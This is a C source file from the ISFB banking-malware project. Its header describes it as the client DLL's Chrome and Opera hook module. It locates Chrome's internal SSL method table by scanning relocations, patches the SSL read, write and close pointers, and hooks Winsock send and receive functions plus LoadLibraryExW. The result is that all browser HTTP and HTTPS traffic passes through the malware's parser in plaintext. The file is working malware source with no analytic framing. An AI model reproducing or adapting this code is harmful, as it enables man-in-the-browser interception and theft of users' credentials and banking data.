//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: crhook.c
// $Revision: 396 $
// $Date: 2014-11-09 23:33:22 +0300 (Вс, 09 ноя 2014) $
// description:
//	ISFB client DLL. Chrome and Opera(v16+) specific hooks.
//
//  There's internal class HttpStreamParser responsible for sending, receiveing and parsing HTTP data.
//	(http://codesearch.google.com/#OAMlx_jo-ck/src/net/http/http_stream_parser.cc&exact_package=chromium)
//	It has four methods we could be interested in:
//		HttpStreamParser::DoSendHeaders
//		HttpStreamParser::DoSendBody
//		HttpStreamParser::DoReadHeaders
//		HttpStreamParser::DoReadBody
//	Both of DoSendXXX methods use the same method to write a data: connection_->socket()->Write,
//	 which is TCPClientSocketWin::Write function for TCP and SSLClientSocketNSS::Write for SSL connection.
//	Both of DoReadXXX methods use connection_->socket()->Read, which is 
//	 TCPClientSocketWin::Read function for TCP and SSLClientSocketNSS::Read for SSL.	
//	We cannot find and hook Write and Read methods directly because they are not exported and it seems almost impossible
//	 to find them using any kind of heuristic. Instead of this we can hook some low-level functions called by theese
//	 methods. They are: 
//		ssl_PR_Write, ssl_PR_Read for SSL-type connection,
//		WSASend, WSAReceive for usual TCP connection.



#include "..\common\common.h"
#include "..\crm.h"

#include <winsock2.h>

#include "parser.h"
#include "prio.h"

#define		szTcpMagic	"tcp.writes"

#define		RECV_WAIT_TIMEOUT	500	// milliseconds

// ---- Predifinitions --------------------------------------------------------------------------------------------------
typedef struct _WSA_CONTEXT
{
	LPWSAOVERLAPPED	lpOverlapped;
	ULONG_PTR		Flags;
} WSA_CONTEXT, *PWSA_CONTEXT;

#define	WSA_READ	0
#define	WSA_WRITE	1

typedef	struct _CR_ASYNC_CONTEXT
{
	LPWSAOVERLAPPED	lpOverlapped;
	DWORD			Flags;
	SOCKET			Socket;
	HANDLE			hEvent;
	HANDLE			hWait;
	DWORD			BufferCount;
	WSABUF			Buffers[0];
} CR_ASYNC_CONTEXT, *PCR_ASYNC_CONTEXT;


typedef LONG (_stdcall* FUNC_recv)(SOCKET s, PCHAR buf, LONG len, LONG flags);

typedef LONG (_stdcall* FUNC_WSARecv)(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, 
			LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

typedef LONG (_stdcall* FUNC_WSASend)(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, 
			DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

typedef LONG (_stdcall* FUNC_closesocket)(SOCKET s);


LONG	my_WSARecv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags,
				LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

LONG	my_WSASend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags,
				LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

LONG	my_closesocket(SOCKET s);
LONG	my_select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
static LONG	my_recv(SOCKET s, PCHAR buf, LONG len, LONG flags);

LONG	_cdecl my_SSL_Read(HANDLE fd, PCHAR	buf, LONG amount);
LONG	_cdecl my_SSL_Write(HANDLE fd, PCHAR buf, LONG amount);
LONG	_cdecl my_SSL_Close(HANDLE fd);


HMODULE WINAPI my_LoadLibraryExW(LPWSTR lpFileName, HANDLE hFile, DWORD dwFlags);
HOOK_FUNCTION hook_LoadLibraryExW		= {szKernel32, szLoadLibraryExW, &my_LoadLibraryExW, NULL};

static HOOK_DESCRIPTOR LoadLibraryIatHook =
	DEFINE_HOOK(&hook_LoadLibraryExW, HF_TYPE_IAT);

static HOOK_DESCRIPTOR LoadLibraryExportHook = 
	DEFINE_HOOK(&hook_LoadLibraryExW, HF_TYPE_EXPORT);


static HOOK_FUNCTION hook_WSARecv		= {szWS2_32, szWSARecv, &my_WSARecv, NULL};
static HOOK_FUNCTION hook_WSASend		= {szWS2_32, szWSASend, &my_WSASend, NULL};
static HOOK_FUNCTION hook_closesocket	= {szWS2_32, szclosesocket, &my_closesocket, NULL};
static HOOK_FUNCTION hook_closesocket0	= {szWS2_32, (PCHAR)(ULONG_PTR)(0x3 | IMAGE_ORDINAL_FLAG), &my_closesocket, NULL};
static HOOK_FUNCTION hook_recv			= {szWS2_32, szrecv, &my_recv, NULL};
static HOOK_FUNCTION hook_recv0		= {szWS2_32, (PCHAR)(ULONG_PTR)(0x10 | IMAGE_ORDINAL_FLAG), &my_recv, NULL};


static HOOK_FUNCTION hook_SSL_Read		= {szChrome, NULL, &my_SSL_Read, NULL};
static HOOK_FUNCTION hook_SSL_Write	= {szChrome, NULL, &my_SSL_Write, NULL};
static HOOK_FUNCTION hook_SSL_Close	= {szChrome, NULL, &my_SSL_Close, NULL};


static HOOK_DESCRIPTOR CrPointerHooks[] = {
	DEFINE_HOOK(&hook_SSL_Read, HF_TYPE_PTR),
	DEFINE_HOOK(&hook_SSL_Write, HF_TYPE_PTR),
	DEFINE_HOOK(&hook_SSL_Close, HF_TYPE_PTR)
};

static HOOK_DESCRIPTOR CrIatHooks[] = {
	DEFINE_HOOK(&hook_closesocket, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_closesocket0, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_recv, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_recv0, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_WSARecv, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_WSASend, HF_TYPE_IAT | HF_PATCH_NAME)
};


LONG _cdecl	CR_WSAClose(HANDLE fd, PVOID context);
LONG _cdecl CR_WSAGetError(PVOID context);
VOID _cdecl CR_WSASetError(LONG Error, LONG Flags, PVOID context);
LONG _cdecl CR_WSARead(HANDLE fd, PCHAR buf, LONG amount, PVOID context);
LONG _cdecl CR_WSAWrite(HANDLE fd, PCHAR buf, LONG amount, PVOID context);
LONG _cdecl CR_WSAPoll(PRPollDesc *pds, LONG npds, LONG timeout);
LONG _cdecl CR_SSLGetError(PVOID context);
VOID _cdecl CR_SSLSetError(LONG Error, LONG Flags, PVOID context);
LONG _cdecl CR_WSrecv(HANDLE fd, PCHAR buf, LONG amount, PVOID context);



// ----- Globals ---------------------------------------------------------------------------------------------------------------

PRAPI	g_WSA_Api = {&CR_WSAClose, &CR_WSARead, &CR_WSAWrite, &CR_WSAPoll, &CR_WSAGetError, &CR_WSASetError};
PRAPI	g_WS_Api = {NULL, &CR_WSrecv, NULL, NULL, &CR_WSAGetError, &CR_WSASetError};
PRAPI	g_SSL_Api = {NULL, NULL, NULL, NULL, &CR_SSLGetError, &CR_SSLSetError};


//
//	Searches for SSL class method table.
//	The idea is:
//		- scan the CHROME.DLL image relocation section to enumerate all code pointers within the ".rdata" section
//		- select the PRIO_METHODS structure containing code pointers found with "fyle_type" field equal to PRIO_FILE_TYPE_SSL
//
WINERROR CrFindSSLMethodTable(
	HMODULE			hChrome, 
	PPRIO_METHODS*	pSslMethods
	)
{
	WINERROR	Status = ERROR_BAD_FORMAT;
	PIMAGE_DOS_HEADER		ChromeBase = (PIMAGE_DOS_HEADER)hChrome;
	PIMAGE_NT_HEADERS		Pe = (PIMAGE_NT_HEADERS)((PCHAR)ChromeBase + ChromeBase->e_lfanew);
	PIMAGE_DATA_DIRECTORY	DataDir;
	PIMAGE_SECTION_HEADER	pRdata, pText ;
	PIMAGE_BASE_RELOCATION_EX	Reloc;
	LONG	RelocSize;
	ULONG_PTR	CodeStart, CodeSize, RdataSize;

	*pSslMethods = NULL;

	do 
	{
		if (!(pRdata = PeSupFindSectionByName((PCHAR)ChromeBase, (PSECTION_NAME)szRdataSec)))
			break;

		if (!(pText = PeSupFindSectionByName((PCHAR)ChromeBase, (PSECTION_NAME)szTextSec)))
			break;

		CodeStart = (ULONG_PTR)ChromeBase + pText->VirtualAddress;
		CodeSize = (ULONG_PTR)max(pText->Misc.VirtualSize, pText->SizeOfRawData);
		RdataSize = (ULONG_PTR)max(pRdata->Misc.VirtualSize, pRdata->SizeOfRawData);


		DataDir = &Pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		if (!DataDir->VirtualAddress || !(RelocSize = DataDir->Size))
			break;

		Reloc = (PIMAGE_BASE_RELOCATION_EX)((PCHAR)ChromeBase + DataDir->VirtualAddress);

		while(Status != NO_ERROR && RelocSize > sizeof(IMAGE_BASE_RELOCATION))
		{
			ULONG	i, NumberRelocs = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PCHAR	PageVa = (PCHAR)ChromeBase + Reloc->VirtualAddress;

			if (Reloc->VirtualAddress >= pRdata->VirtualAddress &&
				Reloc->VirtualAddress < (pRdata->VirtualAddress + RdataSize))
			{
				for (i=0; i<NumberRelocs; i++)
				{
					USHORT	RelocType = (Reloc->TypeOffset[i] >> IMAGE_REL_BASED_SHIFT);

					if (RelocType == IMAGE_REL_BASED_HIGHLOW)
					{
						ULONG_PTR p;
						PPRIO_METHODS	pMethods;

						pMethods = (PPRIO_METHODS)((PULONG_PTR)(PageVa + (Reloc->TypeOffset[i] & IMAGE_REL_BASED_MASK)) - 1);

						//	PRIO_METHODS.fyle_type field is equal to PRIO_FILE_TYPE_SSL
						if (pMethods->file_type == PRIO_FILE_TYPE_SSL &&
							// PRIO_METHODS.close != PRIO_METHODS.read != PRIO_METHODS.write
							(p = (ULONG_PTR)pMethods->close) != (ULONG_PTR)pMethods->read && p != (ULONG_PTR)pMethods->write && 
							(ULONG_PTR)pMethods->read != (ULONG_PTR)pMethods->write &&
							// PRIO_METHODS.available == PRIO_METHODS.fsync (i.e. no methods defined)
							(p = (ULONG_PTR)pMethods->available) && p == (ULONG_PTR)pMethods->fsync && 
							// PRIO_METHODS.available != PRIO_METHODS.close != PRIO_METHODS.read != PRIO_METHODS.write 
							//	(i.e. methods close, read, write are defined)
							p != (ULONG_PTR)pMethods->close && p != (ULONG_PTR)pMethods->read && p != (ULONG_PTR)pMethods->write &&
							// All pointers are within the code section
							(p = (ULONG_PTR)pMethods->close) >= CodeStart && p <(CodeStart + CodeSize) &&
							(p = (ULONG_PTR)pMethods->read) >= CodeStart && p <(CodeStart + CodeSize) &&
							(p = (ULONG_PTR)pMethods->write) >= CodeStart && p <(CodeStart + CodeSize) &&
							// PRIO_METHODS.read && PRIO_METHODS.write functions start with "PUSH EBP" opcode
							*(PUCHAR)pMethods->read == 0x55 && *(PUCHAR)pMethods->write == 0x55)
						{
							*pSslMethods = pMethods;
							Status = NO_ERROR;
							break;
						}
					}	// if (RelocType == IMAGE_REL_BASED_HIGHLOW)
				}	// for (i=0; i<NumberRelocs; i++)
			}	// if (RelocSize >= (LONG)Reloc->SizeOfBlock)
			RelocSize -= (LONG)Reloc->SizeOfBlock;
			Reloc = (PIMAGE_BASE_RELOCATION_EX)((PCHAR)Reloc + Reloc->SizeOfBlock);
		}	// while(RelocSize > IMAGE_SIZEOF_BASE_RELOCATION)
	} while(FALSE);

	return(Status);
}

//
//	Common function used to set hooks for Chrome and Opera(v16+).
//
WINERROR CrSetHooksInternal(
	HMODULE	hTarget	// target module handle (CHROME.DLL or OPERA.EXE)
	)
{
	WINERROR	Status = NO_ERROR;
	PPRIO_METHODS	SslMethods;

	do
	{
		if ((Status = CrFindSSLMethodTable(hTarget, &SslMethods)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: SSL method table not found. Unsupported CHROME/OPERA version.\n", g_CurrentProcessId);
			break;
		}
		else
		{
			DbgPrint("ISFB_%04x: SSL method table found at 0x%p\n", g_CurrentProcessId, SslMethods);
		}

		hook_SSL_Read.pHookedFunction = (PIAT_ENTRY)&SslMethods->read;
		hook_SSL_Write.pHookedFunction = (PIAT_ENTRY)&SslMethods->write;
		hook_SSL_Close.pHookedFunction = (PIAT_ENTRY)&SslMethods->close;

		// Hooking chrome.dll internal SSL PR functions
		if ((Status = SetPointerHook(&hook_SSL_Read, NULL)) != NO_ERROR)
			break;

		if ((Status = SetPointerHook(&hook_SSL_Write, NULL)) != NO_ERROR)
			break;

		if ((Status = SetPointerHook(&hook_SSL_Close, NULL)) != NO_ERROR)
			break;

		// It's safe to initilaize Original pointers here because this function called either before the process starts or 
		//  while chrome.dll is being loaded.
		g_SSL_Api.Close = hook_SSL_Close.Original;
		g_SSL_Api.Read = hook_SSL_Read.Original;
		g_SSL_Api.Write = hook_SSL_Write.Original;
		g_SSL_Api.Poll = SslMethods->poll;

		// Hooking target imports of ws2_32 functions
		g_HandleTable->Flags |= TF_REUSE_HANDLE;
		Status = SetMultipleHooks((PHOOK_DESCRIPTOR)&CrIatHooks, sizeof(CrIatHooks) / sizeof(HOOK_DESCRIPTOR), hTarget);

		// Registering IAT hooks for every loaded DLL containing bound import
//		SetOnDllLoadHooks(CrIatHooks, sizeof(CrIatHooks) / sizeof(HOOK_DESCRIPTOR));

	} while(FALSE);

	return(Status);
}


WINERROR OpSetHooks(VOID)
{
	WINERROR	Status = ERROR_FILE_NOT_FOUND;
	HMODULE		hOpera;

	if (hOpera = GetModuleHandleA(szOpera))
		Status = CrSetHooksInternal(hOpera);
	else
	{
		DbgPrint("ISFB_%04x: Unable to locate OPERA.EXE, leaving.\n", g_CurrentProcessId);
	}

	return(Status);
}


WINERROR CrSetHooks(VOID)
{
	WINERROR	Status = NO_ERROR;
	HMODULE		hChrome;

	if (hChrome = GetModuleHandleA(szChrome))
		Status = CrSetHooksInternal(hChrome);
	else
	{
		// chrome.dll is being loaded dynamicly during application init.
		// Currently we do not know where it will be loaded from, so we have to hook LoadLibrary and wait 
		//  until chrome.dll is ready.
		DbgPrint("ISFB_%04x: Unable to locate CHROME.DLL, waiting until it is loaded.\n", g_CurrentProcessId);
		Status = ParserHookImportExport((PHOOK_DESCRIPTOR)&LoadLibraryIatHook, 1, (PHOOK_DESCRIPTOR)&LoadLibraryExportHook, 1);
		// Registering IAT hooks for every loaded DLL containing bound import
//		SetOnDllLoadHooks((PHOOK_DESCRIPTOR)&LoadLibraryIatHook, 1);
	}

	return(Status);
}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Rerurns number of bytes avaliable to read from the specified WSA socket.
//
LONG WSAAvaliable(SOCKET s)
{
	LONG	bRet, bRead = 0;

	bRet = ioctlsocket(s, FIONREAD, &bRead);

	if (bRet != SOCKET_ERROR)
		bRet = bRead;
	else
	{
		bRead = GetLastError();
		ASSERT(FALSE);
	}

	return(bRet);	
}


LONG _cdecl CR_WSARead(HANDLE fd, PCHAR buf, LONG amount, PVOID context)
{
	PWSA_CONTEXT	pWsaCtx = (PWSA_CONTEXT)context;
	WSABUF	Buffers = {amount, buf};
	LONG	bRet = SOCKET_ERROR, bRead = 0;
	ULONG	Flags = 0;

	if (!context)
	{
		bRet = WSARecv((SOCKET)fd, &Buffers, 1, &bRead, &Flags, NULL, NULL);

		if (bRet == SOCKET_ERROR && GetLastError() == WSAEWOULDBLOCK)
			SetLastError(ERROR_NO_DATA);
	}	// if (!context)
	else
		// Pass-through call, return values will be transfered to a browser.
		bRet = WSARecv((SOCKET)fd, &Buffers, 1, &bRead, (LPDWORD)pWsaCtx->Flags, pWsaCtx->lpOverlapped, NULL);

	if (bRet != SOCKET_ERROR)
	{
		bRet = bRead;
//		if (!context && bRead)
//			ParserCheckReceiveDisableSpdy(buf, bRead);
	}
		
	return(bRet);
}

LONG _cdecl CR_WSAWrite(HANDLE fd, PCHAR buf, LONG amount, PVOID context)
{
	PWSA_CONTEXT	pWsaCtx = (PWSA_CONTEXT)context;
	WSABUF	Buffers = {amount, buf};
	LONG	bRet = 0, bSent = 0;
	ULONG	Flags = 0;
	WSAOVERLAPPED	Ovl = {0};

	if (!context)
	{
		// Internal call, writing synchronously
		if (Ovl.hEvent = WSACreateEvent())
		{
			bRet = WSASend((SOCKET)fd, &Buffers, 1, &bSent, Flags, &Ovl, NULL);
			if (bRet == SOCKET_ERROR && (WSAGetLastError() == WSA_IO_PENDING))
				bRet = WaitForSingleObject(Ovl.hEvent, INFINITE);

			if (bRet == NO_ERROR)
				bSent = (LONG)Ovl.InternalHigh;

			CloseHandle(Ovl.hEvent);
		}	// if (Ovl.hEvent = WSACreateEvent())
	}	// if (!context)
	else
		// Pass-through call, return values will be transfered to a browser.
		bRet = WSASend((SOCKET)fd, &Buffers, 1, &bSent, (ULONG)pWsaCtx->Flags, pWsaCtx->lpOverlapped, NULL);

	if (bRet != SOCKET_ERROR)
		bRet = bSent;

	return(bRet);
}


LONG _cdecl CR_WSrecv(HANDLE fd, PCHAR buf, LONG amount, PVOID context)
{
	LONG bRet;

	bRet = recv((SOCKET)fd, buf, amount, 0);

//	if (bRet != SOCKET_ERROR)
//	{
//		if (!context && bRet)
//			ParserCheckReceiveDisableSpdy(buf, bRet);
//	}
		
	return(bRet);
}


LONG _cdecl	CR_WSAClose(HANDLE fd, PVOID context)
{
	return(closesocket((SOCKET)fd));
	UNREFERENCED_PARAMETER(context);
}

LONG _cdecl CR_WSAGetError(PVOID Context)
{
	LONG Error = WSAGetLastError();

	if (Error == WSA_IO_PENDING || Error == ERROR_NO_DATA || Error == WSAEWOULDBLOCK)
		Error = PR_WOULD_BLOCK_ERROR;

	return(Error);
	UNREFERENCED_PARAMETER(Context);
}

VOID _cdecl CR_WSASetError(LONG Error, LONG Flags, PVOID Context)
{
	switch(Error)
	{
	case PR_CONNECT_RESET_ERROR:
		Error = WSAENETRESET;
		break;
	case PR_WOULD_BLOCK_ERROR:
		Error = WSA_IO_PENDING;
		break;
	default:
		ASSERT(FALSE);
	}

	WSASetLastError(Error);

	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(Context);
}


LONG _cdecl CR_WSAPoll(PRPollDesc *pds, LONG npds, LONG timeout)
{
	LONG	bRet = 0;

	ASSERT(timeout == 0);
	ASSERT(npds == 1);
	ASSERT(pds->in_flags == PR_POLL_READ);

	if (WSAAvaliable((SOCKET)pds->fd))
	{
		pds->out_flags = PR_POLL_READ;
		bRet = 1;
	}
	return(bRet);
}


LONG  CR_Recv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped)
{
	LONG	bRet = SOCKET_ERROR;
	ULONG	bRead = 0;
	WSA_CONTEXT	WsaCtx;
	PR_SOCKET	Ps;

//	return(WSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine));

	WsaCtx.Flags = (ULONG_PTR)lpFlags;
	WsaCtx.lpOverlapped = lpOverlapped;

	Ps.fd = (HANDLE)s;
	Ps.Api = &g_WSA_Api;
	Ps.Context = &WsaCtx;
	Ps.Flags = 0;

	while(dwBufferCount)
	{
		bRet = PRIO_Read(&Ps, lpBuffers->buf, lpBuffers->len);
		if (bRet >= 0)
		{
			bRead += (ULONG)bRet;
			if ((ULONG)bRet < lpBuffers->len)
				dwBufferCount = 1;	// break
			bRet = NO_ERROR;
		}
		else
			break;
	
		lpBuffers += 1;
		dwBufferCount -= 1;
	}	// while(dwBufferCount)

	if (bRet == NO_ERROR)
	{
		if (lpOverlapped)
		{
			lpOverlapped->Internal = 0;
			lpOverlapped->InternalHigh = bRead;
			lpOverlapped->Offset = 0;
			lpOverlapped->OffsetHigh = 0;

			if (lpOverlapped->hEvent)
				WSASetEvent(lpOverlapped->hEvent);
		}	// if (lpOverlapped)

		if (lpNumberOfBytesRecvd)
			*lpNumberOfBytesRecvd = bRead;
	}	// if (bRet == NO_ERROR)

	return(bRet);
}


VOID CALLBACK CR_WaitCallback(
	PVOID	lpParameter,
	BOOLEAN TimerOrWaitFired
	)
{
	PCR_ASYNC_CONTEXT	CrCtx = (PCR_ASYNC_CONTEXT)lpParameter;
	WSANETWORKEVENTS	NetEvents;

	ENTER_HOOK();

	ASSERT(TimerOrWaitFired == FALSE);

	// Querying wait result
	WSAEnumNetworkEvents(CrCtx->Socket, CrCtx->hEvent, &NetEvents);

	// Performing a cleanup
	UnregisterWait(CrCtx->hWait);
	WSAEventSelect(CrCtx->Socket, 0, 0);
	WSACloseEvent(CrCtx->hEvent);

//	DbgPrint("ISFB_%04x: Wait callback on event %u, status %u\n", g_CurrentProcessId, NetEvents.lNetworkEvents, NetEvents.iErrorCode[FD_READ_BIT]);

	if (NetEvents.lNetworkEvents == FD_READ)
	{
		LONG bRet;
		do
		{
			bRet = CR_Recv(CrCtx->Socket, (LPWSABUF)&CrCtx->Buffers, CrCtx->BufferCount, 0, &CrCtx->Flags, CrCtx->lpOverlapped);

			if (bRet != NO_ERROR && CrCtx->lpOverlapped->Internal == STATUS_PENDING)
				Sleep(100);
			else
				bRet = NO_ERROR;

		} while(bRet != NO_ERROR);
	}	// if (NetEvents.lNetworkEvents == FD_READ)

	hFree(CrCtx);

	LEAVE_HOOK();
}



// ---- SSL stubs --------------------------------------------------------------------------------------------------------

LONG _cdecl CR_SSLGetError(PVOID Context)
{
	LONG Error = PR_WOULD_BLOCK_ERROR;

	return(Error);
	UNREFERENCED_PARAMETER(Context);
}

VOID _cdecl CR_SSLSetError(LONG Error, LONG Flags, PVOID Context)
{

	UNREFERENCED_PARAMETER(Error);
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(Context);
}


// ---- Chrome-specific hook functions ------------------------------------------------------------------------------------

LONG _stdcall my_WSARecv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags,
				LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	LONG	bRet;

	ENTER_HOOK();
	
	ASSERT(lpCompletionRoutine == NULL);
	ASSERT(lpOverlapped);
	ASSERT(lpOverlapped->hEvent);
	ASSERT(dwBufferCount);
	ASSERT(lpNumberOfBytesRecvd);
	ASSERT(WaitForSingleObject(lpOverlapped->hEvent, 0) == WAIT_TIMEOUT);

	// Trying to read
	bRet = CR_Recv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped);

	// Checking if there's no data was ready to read from the socket
	if (bRet == SOCKET_ERROR && WSAGetLastError() == ERROR_NO_DATA)
	{
		PCR_ASYNC_CONTEXT CrCtx = hAlloc(sizeof(CR_ASYNC_CONTEXT) + sizeof(WSABUF) * dwBufferCount);
		if (CrCtx)
		{
			BOOL Ret = FALSE;

			// Copying all parameters
			CrCtx->Socket = s;
			CrCtx->Flags = *lpFlags;
			CrCtx->lpOverlapped = lpOverlapped;

			// Copying WSABUF structures
			memcpy(&CrCtx->Buffers, lpBuffers, sizeof(WSABUF) * dwBufferCount);
			CrCtx->BufferCount = dwBufferCount;

			// Initializing overlapped operation
			lpOverlapped->Internal = STATUS_PENDING;

			// Creating an event object
			if (CrCtx->hEvent = WSACreateEvent())
			{
				// Initializing asynchronouse select operation
				if (WSAEventSelect(s, CrCtx->hEvent, FD_READ) == NO_ERROR)
					// Registering wait-callback
					Ret = RegisterWaitForSingleObject(&CrCtx->hWait, CrCtx->hEvent, &CR_WaitCallback, CrCtx, INFINITE, WT_EXECUTEONLYONCE);
			}	// if (CrCtx->hEvent = WSACreateEvent())

			if (!Ret)
			{
				ASSERT(FALSE);
				hFree(CrCtx);
			}
		}	// if (CrCtx)

		// Seting last error once again bacause we could waste it while calling APIs before here
		WSASetLastError(WSA_IO_PENDING);
	}	// if (bRet == SOCKET_ERROR && GetLastError() == WSA_IO_PENDING)

	LEAVE_HOOK();
	return(bRet);
}

LONG	my_WSASend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags,
				LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	LONG		bRet = SOCKET_ERROR;
	ULONG		bSent = 0;
	WSA_CONTEXT	WsaCtx;
	PR_SOCKET	Ps;

//	return(WSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine));

	ENTER_HOOK();

	ASSERT(lpCompletionRoutine == NULL);

	WsaCtx.Flags = (ULONG_PTR)dwFlags;
	WsaCtx.lpOverlapped = lpOverlapped;

	Ps.fd = (HANDLE)s;
	Ps.Api = &g_WSA_Api;
	Ps.Context = &WsaCtx;
	Ps.Flags = 0;

	while(dwBufferCount)
	{
		bRet = PRIO_Write(&Ps, lpBuffers->buf, lpBuffers->len);
		if (bRet >= 0)
		{
			bSent += bRet;
			bRet = NO_ERROR;
		}
		else
			break;

		lpBuffers += 1;
		dwBufferCount -= 1;
	}	// while(dwBufferCount)

	if (bRet == NO_ERROR)
	{
		if (lpOverlapped)
		{
			lpOverlapped->Internal = 0;
			lpOverlapped->InternalHigh = bSent;
			lpOverlapped->Offset = 0;
			lpOverlapped->OffsetHigh = 0;

			if (lpOverlapped->hEvent)
				WSASetEvent(lpOverlapped->hEvent);
		}	// if (lpOverlapped)

		if (lpNumberOfBytesSent)
			*lpNumberOfBytesSent = bSent;
	}	// if (bRet == NO_ERROR)

	LEAVE_HOOK();
	return(bRet);
}

static LONG	my_recv(SOCKET s, PCHAR buf, LONG len, LONG flags)
{
	LONG bRet;
	PR_SOCKET Ps;

	ENTER_HOOK();

	Ps.fd = (HANDLE)s;
	Ps.Api = &g_WS_Api;
	Ps.Context = NULL;
	Ps.Flags = 0;

	bRet = PRIO_Read(&Ps, buf, len);

	LEAVE_HOOK();

	return(bRet);
}

LONG	my_closesocket(SOCKET s)
{
	LONG	bRet = 0;
	PR_SOCKET Ps;

	ENTER_HOOK();

	Ps.fd = (HANDLE)s;
	Ps.Api = &g_WSA_Api;
	Ps.Context = NULL;

	bRet = PRIO_Close(&Ps);

	LEAVE_HOOK();
	return(bRet);

}

// ---- SSL support hooks -----------------------------------------------------------------------------------------------------
LONG _cdecl my_SSL_Read(
	HANDLE	fd,		// socket handle
	PCHAR	buf,	// buffer to store the bytes read
	LONG	amount	// number of bytes to read
	)
{
	LONG	Ret;
	PR_SOCKET	Ps;
	ENTER_HOOK();

	Ps.fd = fd;
	Ps.Api = &g_SSL_Api;
	Ps.Flags = PR_SOCKET_FLAG_SSL;

	if (g_HookInit)
		Ret = PRIO_Read(&Ps, buf, amount);
	else
		Ret = Ps.Api->Read(Ps.fd, buf, amount, NULL);

	LEAVE_HOOK();
	return(Ret);
}


LONG	_cdecl my_SSL_Write(HANDLE fd, PCHAR buf, LONG amount)
{
	LONG Ret;
	PR_SOCKET	Ps;
	ENTER_HOOK();

	Ps.fd = fd;
	Ps.Api = &g_SSL_Api;
	Ps.Flags = PR_SOCKET_FLAG_SSL;

	if (g_HookInit)
		Ret = PRIO_Write(&Ps, buf, amount);
	else
		Ret = Ps.Api->Write(Ps.fd, buf, amount, NULL);

	LEAVE_HOOK();
	return(Ret);
}


LONG	_cdecl my_SSL_Close(HANDLE fd)
{
	LONG	Ret;
	PR_SOCKET	Ps;
	ENTER_HOOK();

	Ps.fd = fd;
	Ps.Api = &g_SSL_Api;

	if (g_HookInit)
		Ret = PRIO_Close(&Ps);
	else
		Ret = Ps.Api->Close(Ps.fd, NULL);

	LEAVE_HOOK();
	return(Ret);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	This function used to detect the moment when chrome.dll loaded to set application hooks.
//
HMODULE WINAPI my_LoadLibraryExW(LPWSTR lpFileName, HANDLE hFile, DWORD dwFlags)
{
	HMODULE hModule, hChrome;

	ENTER_HOOK();

	hChrome = GetModuleHandleA(szChrome);
	hModule = LoadLibraryExW(lpFileName, hFile, dwFlags);

	if (!hChrome && hModule && GetModuleHandleA(szChrome))
	{
		DbgPrint("ISFB_%04x: CHROME.DLL loaded, setting hooks.\n", g_CurrentProcessId);
		CrSetHooks();
	}

	LEAVE_HOOK();
	return(hModule);
}
